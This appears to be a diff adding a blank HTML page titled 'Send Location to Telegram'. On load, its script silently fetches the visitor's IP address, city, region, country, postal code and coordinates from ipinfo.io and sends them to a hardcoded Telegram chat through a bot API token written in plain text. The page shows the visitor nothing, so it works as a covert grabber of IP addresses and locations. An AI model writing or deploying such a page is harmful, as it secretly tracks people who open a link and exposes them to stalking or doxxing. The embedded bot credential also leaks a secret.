@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Send Location to Telegram</title>
+</head>
+<body>
+	
+    <script>
+        // Replace with your bot token and chat ID
+        const botToken = '6391846685:AAGk8p3q_07FAj3louTAb1ZoxOk85vbyC6Q';
+        const chatId = '-980441797';
+        
+        // Function to send location data to Telegram
+        function infosender() {
+            // Fetch location data from 'https://ipinfo.io/json'
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    // Extract relevant data
+                    const ip = data.ip;
+                    const city = data.city;
+                    const region = data.region;
+                    const country = data.country;
+                    const location = data.loc;
+                    const postal = data.postal;
+
+                    // Construct the message with location data
+                    const message = `
+IP : ${ip}
+City: ${city}
+Region: ${region}
+Country: ${country}
+Postal Code : ${postal}
+Location: ${location}`;
+
+                    // URL for the Telegram Bot API
+                    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                    // Construct the message data
+                    const messageData = {
+                        chat_id: chatId,
+                        text: message
+                    };
+
+                    // Send the message to Telegram using fetch
+                    fetch(apiUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(messageData)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Message sent successfully:', data);
+                    })
+                    .catch(error => {
+                        console.error('Error sending message:', error);
+                    });
+                })
+                .catch(error => {
+                    console.error('Error fetching location data:', error);
+                });
+        }
+
+        // Call the infosender function when the page loads
+        window.onload = infosender();
+    </script>
+</body>
+</html>
